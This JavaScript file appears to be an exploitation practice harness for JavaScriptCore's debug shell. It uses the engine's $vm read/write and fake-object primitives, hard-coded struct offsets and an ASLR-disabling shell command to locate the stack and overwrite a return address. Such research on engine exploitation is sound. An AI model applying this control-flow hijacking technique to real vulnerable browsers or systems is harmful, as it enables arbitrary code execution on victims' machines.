// Disable ASLR:
// setarch `uname -m` -R /bin/bash
// Dump stuff:
// python3 Tools/Scripts/dump-class-layout -t WebKitBuild/JSCOnly/Debug/lib/libJavaScriptCore.so JavaScriptCore JSC::JITCode

const verbose = true
let output = true

// -------------------------------------------------------------------------

function addrOf(o, doOutput = true) {
    return $vm.addrOf(o, verbose && output && doOutput)
}

function fakeObj(o) {
    return $vm.fakeObj(o, verbose && output)
}

function read64(addr) {
    return $vm.read64(addr, verbose && output)
}

function write64(addr, val) {
    return $vm.write64(addr, val, verbose && output)
}

// -------------------------------------------------------------------------

const verboseDeref = true

function p(s) {
    if (!output)
        return
    print(s)
}
function hd(i) { p("0x" + i.toString(16)) }

function inspectCell(c) {
    $vm.dumpCell(c)
}

const offsetMap = new Map([
    ["JSFunction::executableOrRareData", 24n],
    ["ExecutableBase::m_jitCodeForCall", 8n],
    ["JITCode::executableAddress", 24n],
    ["JSGlobalObject::m_vm", 64n],
    ["VM::topEntryFrame", 56n],
    ["JSGlobalProxy::m_target", 16n],
])
function offset(field) {
    if (!offsetMap.has(field))
        throw field
    return offsetMap.get(field)
}

function deref(o, field) {
    let orig = field
    if (field.includes(".")) {
        let s = field.split(".")
        field = s.pop()
        o = fakeObj(deref(o, s.join(".")))
    }

    let value = read64(addrOf(o, false) + offset(field))

    if (verboseDeref)
        p(orig + " -> 0x" + value.toString(16))
    return value
}

function derefAssign(o, field, val) {
    let orig = field
    if (field.includes(".")) {
        let s = field.split(".")
        field = s.pop()
        o = fakeObj(deref(o, s.join(".")))
    }

    output = false
    let value = read64(addrOf(o, false) + offset(field))
    write64(addrOf(o) + offset(field), val)
    let newVal = read64(addrOf(o, false) + offset(field))
    output = true;

    if (verboseDeref)
        p(orig + " : 0x" + value.toString(16) + " -> 0x" + newVal.toString(16))
    return value
}

// -------------------------------------------------------------------------

if (verbose)
    $vm.dumpRegisters()

let stack = deref(globalThis, "JSGlobalProxy::m_target.JSGlobalObject::m_vm.VM::topEntryFrame")
p("A stack address:")
hd(stack)

p("---")

function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
    if (verbose)
        $vm.dumpRegisters()

    let myStack = 0
    for (let i = stack; ; i -= 16n) {
        output = false
        let a = read64(i)
        let b = read64(i + 8n)
        output = true

        if (a == 0xfffe0000000000bfn && b == 0xfffe0000000000efn) {
            myStack = i
            break
        }
    }

    p("Found my stack: ")
    hd(myStack)

    p("Found ret pc at:")
    let retPC = myStack - 0x7fffd8f05240n + 0x7fffd8f05218n
    hd(retPC)
    hd(read64(retPC))

    write64(retPC, 0xBFBF691137n)
}

findReturnAddress(0xBF, 0xEF)

